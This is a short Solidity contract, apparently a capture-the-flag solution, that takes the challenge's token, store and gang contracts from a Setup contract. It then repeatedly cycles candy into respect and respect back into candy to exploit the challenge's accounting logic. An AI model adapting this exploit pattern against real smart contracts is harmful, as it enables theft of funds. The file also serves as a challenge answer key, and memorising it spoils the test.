// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./crewToken.sol";
import "./respectToken.sol";
import "./candyToken.sol";
import "./fancyStore.sol";
import "./localGang.sol";
import "./Setup.sol";

contract Attack
{
    crewToken public CREW;
    respectToken public RESPECT;
    candyToken public CANDY;
    fancyStore public STORE;
    localGang public GANG;

    constructor(address setupAddress)
    {
        Setup setup = Setup(setupAddress);
        CREW = setup.CREW();
        RESPECT = setup.RESPECT();
        CANDY = setup.CANDY();
        STORE = setup.STORE();
        GANG = setup.GANG();
    }

    function attack() public
    {
        //call the initialize function as it has not been called before
        CREW.mint();

        //verify at the store
        CREW.approve(address(STORE), 1);
        STORE.verification();

        //buyCandies 
        for (uint i=0; i<10; i++)
        {
            //call the gainRespect function
            CANDY.approve(address(GANG), 10);
            GANG.gainRespect(10);

            //Send the respect to the store
            RESPECT.approve(address(STORE), 10);
            STORE.buyCandies(10);
        }
    }
}